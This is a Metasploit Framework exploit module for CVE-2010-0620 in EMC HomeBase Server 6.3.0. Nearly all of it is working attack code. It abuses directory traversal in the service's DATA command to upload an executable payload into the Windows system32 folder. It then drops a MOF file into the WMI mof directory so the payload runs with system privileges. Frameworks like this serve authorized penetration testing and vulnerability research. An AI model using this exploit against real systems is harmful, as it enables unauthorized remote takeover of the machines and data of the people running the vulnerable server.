##
# $Id: emc_homebase_exec.rb 12458 2011-04-27 20:29:27Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::EXE
	include Msf::Exploit::WbemExec

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'EMC HomeBase Server Directory Traversal Remote Code Execution',
			'Description'    => %q{
					This module exploits a directory traversal and remote code execution
				flaw in EMC HomeBase Server 6.3.0.

				Note: This module has only been tested against Windows XP SP3 and Windows 2003 SP2 
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 12458 $',
			'References'     =>
				[
					[ 'CVE', '2010-0620' ],
					[ 'BID', '38380' ],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-020/' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'Space'    => 2048,
					'DisableNops' => true,
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic',  { } ],
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Feb 23 2010'))

		register_options(
			[
				Opt::RPORT(18821),
				OptBool.new('SSL', [true, 'Use SSL', true]),
			], self.class)
	end

	def exploit

		name = exe_name()
		exe_upload(name)
		select(nil,nil,nil,2)
		mof_upload(name)
		select(nil,nil,nil,4)
		handler

	end

	def exe_name

		rand_text_alpha_upper(8) + ".exe"

	end

	def exe_upload(exe_name)

		# this uploads our final exe payload.

		data = generate_payload_exe
		exe_dir = "/..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\WINDOWS\\\\system32\\\\"
	
		connect

		banner = sock.get
			if ( banner =~ /EMC HomeBase HomebaseSSL Service/ )
				print_good("EMC HomeBase HomebaseSSL Service Detected!")
				print_status("Sending exe payload '#{exe_name}'...")
				sock.put("DATA #{exe_dir}#{exe_name} #{data.length}\r\n")
				ready = sock.get
					if ( ready =~ /150 Ready to Recieve Data/ )
						print_good("#{ready.strip}")
						print_status("Sending '#{data.length}' bytes of data...")
						sock.put(data)
						complete = sock.get
						if ( complete =~ /226 Data Complete/ )
							print_good("#{complete.strip}")
							print_status("Sending 'QUIT")
							sock.put("quit\r\n")
							return
						end
					else
						print_error("Something went wrong...")
						return
					end
			else 
				print_error("Not a EMC HomeBaseSSL Service")
				return
			end
		
		disconnect

	end

	def mof_upload(exe_name)

		# this is what runs our uploaded exe payload.

		mof_name = rand_text_alphanumeric(8+rand(8))
		mof      = generate_mof(mof_name, exe_name)
		mof_dir  = "/..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\WINDOWS\\\\system32\\\\wbem\\\\mof\\\\"

		connect

		banner = sock.get
			if ( banner =~ /EMC HomeBase HomebaseSSL Service/ )
				print_good("EMC HomeBase HomebaseSSL Service Detected!")
				print_status("Sending MOF file '#{mof_name}'...")
				sock.put("DATA #{mof_dir}#{mof_name} #{mof.length}\r\n")
				ready = sock.get
					if ( ready =~ /150 Ready to Recieve Data/ )
						print_good("#{ready.strip}")
						print_status("Sending '#{mof.length}' bytes of data...")
						sock.put(mof)
						complete = sock.get
							if ( complete =~ /226 Data Complete/ )
								print_good("#{complete.strip}")
								print_status("Sending 'QUIT")
								sock.put("quit\r\n")
								return
							end
					else
						print_error("Something went wrong...")
						return
					end
			else
				print_error("Not a EMC HomeBaseSSL Service")
				return
                        end

		disconnect

	end
end